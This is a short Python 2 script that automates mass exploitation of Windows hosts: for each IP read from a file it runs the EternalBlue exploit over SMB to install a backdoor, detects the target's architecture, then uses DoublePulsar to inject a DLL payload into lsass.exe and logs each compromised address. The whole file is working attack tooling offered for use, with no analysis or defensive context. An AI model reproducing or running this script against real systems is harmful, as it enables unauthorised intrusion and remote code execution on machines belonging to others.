import sys
import subprocess

def attack(ip):
	print "IP: %s" %ip
	arg = "--VerifyTarget True --VerifyBackdoor True --TargetIp " + ip
	proc = subprocess.Popen("Eternalblue-2.2.0.exe " + arg, stdout=subprocess.PIPE)
	buf,x = proc.communicate()
	if buf.find("Backdoor returned code: 10 - Success") < 0:
		return 
	print 'IP: %s Success!!'%ip
	
	#connet backdoor
	arg = "--Function RunDll --TargetPort 445 --DllOrdinal 1 --NetworkTimeout 20 --Protocol SMB --ProcessName lsass.exe --TargetIp " + ip
	if buf.find("64-bit")>0:
		arg += " --Architecture x64 --DllPayload x64.dll "
		print 'IP: %s is 64-bit' %ip
	elif buf.find("32-bit")>0:
		arg += " --Architecture x86 --DllPayload x86.dll "
		print 'IP: %s is 86-bit' %ip
	else:
		ping_func = "--Function Ping --TargetIp " + ip
		proc = subprocess.Popen("Doublepulsar-1.3.1.exe " + ping_func, stdout=subprocess.PIPE)
		buf,x = proc.communicate()
		if buf.find("64-bit")>0:
			arg += " --Architecture x64 --DllPayload x64.dll "
			print 'IP: %s is 64-bit' %ip
		elif buf.find("32-bit")>0:
			arg += " --Architecture x86 --DllPayload x86.dll "
			print 'IP: %s is 86-bit' %ip
		else:
			print 'Architecture error'
	proc = subprocess.Popen("Doublepulsar-1.3.1.exe " + arg, stdout=subprocess.PIPE)
	buf,x = proc.communicate()
	if buf.find("Command completed successfully")>0:
		print "IP: %s -> Got!!!" %ip
		f = file("c:\log.txt","a")
		f.write(ip + "\r\n")
		f.close()
	
def main():

	ips = []
	f = file( 'c:\ip.txt', 'r')
	line = f.readline()
	line.strip()
	
	while line<>'':
		ips.append(line.strip())
		line = f.readline()
	f.close()
	
	for ip in ips:
		attack(ip)
	
if __name__ == "__main__":
	main()
